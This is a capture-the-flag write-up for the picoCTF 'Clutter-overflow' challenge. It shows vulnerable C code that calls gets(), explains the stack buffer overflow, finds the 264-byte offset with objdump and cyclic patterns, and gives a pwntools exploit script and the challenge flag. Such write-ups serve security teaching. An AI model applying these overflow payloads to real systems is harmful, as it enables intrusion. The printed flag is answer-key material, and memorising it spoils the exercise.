---
title: "Clutter-overflow - picoCTF (pwn, Medium)"
date: 2026-03-18
description: "picoCTF medium pwn challenge — stack buffer overflow to overwrite a local variable."
---

## Task

-Clutter, clutter everywhere and not a byte to use.
-No Hints

---
## Source Code
 
```c
#include <stdio.h>
#include <stdlib.h>
#define SIZE 256
#define GOAL 0xdeadbeef
 
int main(void)
{
  long code = 0;
  char clutter[SIZE];
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);
  puts("My room is so cluttered...");
  puts("What do you see?");
  gets(clutter);
  if (code == GOAL) {
    printf("code == 0x%llx: how did that happen??\n", GOAL);
    puts("take a flag for your troubles");
    system("cat flag.txt");
  } else {
    printf("code == 0x%llx\n", code);
    printf("code != 0x%llx :(\n", GOAL);
  }
  return 0;
}
```

--- 
## Goal
 
Set the local variable `code` equal to the global constant `GOAL` (`0xdeadbeef`).
 
---
## Vulnerability
 
`gets(clutter)` is the vulnerable part of the code.
 
It is a classic **buffer overflow**: the function reads input without any length checking. This allows more bytes to be written into memory than the buffer was originally allocated to hold. As a result, adjacent data on the stack can be overwritten, including other variables — in this case, the local variable `code`.
 
---
## Find the Offset of `code` Relative to RBP
 
Run `objdump` to disassemble the binary:
 
```bash
objdump -d ./chall
```
 
In the output you can find:
 
```
400756: 48 39 45 f8    cmp %rax,-0x8(%rbp)
```
 
This tells us that `code` is located **8 bytes below RBP**.
 
---
## Find the Offset from Input to `code`
 
Generate a non repeating cyclic pattern of 300 bytes:
 
```bash
cyclic 300
```
 
Run the binary in **pwndbg** with this pattern as input. After the crash, check the RBP value:
 
```
RBP  0x626161616161616a ('jaaaaaab')
```
 
Copy the RBP value and use `cyclic -l` to find the offset:
 
```bash
cyclic -l 0x626161616161616a
# Found at offset 272
```
 
Since `code` is 8 bytes below RBP:
 
```
Final offset = 272 - 8 = 264
```
 
--- 
## Payload
 
 After the **264 bytes** we just need to put `0xdeadbeef` in little endian to overwrite the `code` var.
 
### Python Script
 
```python
from pwn import *
 
HOST = "mars.picoctf.net"
PORT = # Enter your Port
 
m = remote(HOST, PORT)
m.recvuntil(b"What do you see?")
 
win = b"\xef\xbe\xad\xde"
payload = b"A" * 264 + win
 
m.sendline(payload)
m.interactive()
```
 
---
## Flag
 
```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```
---
Author: ml0w6c65766c
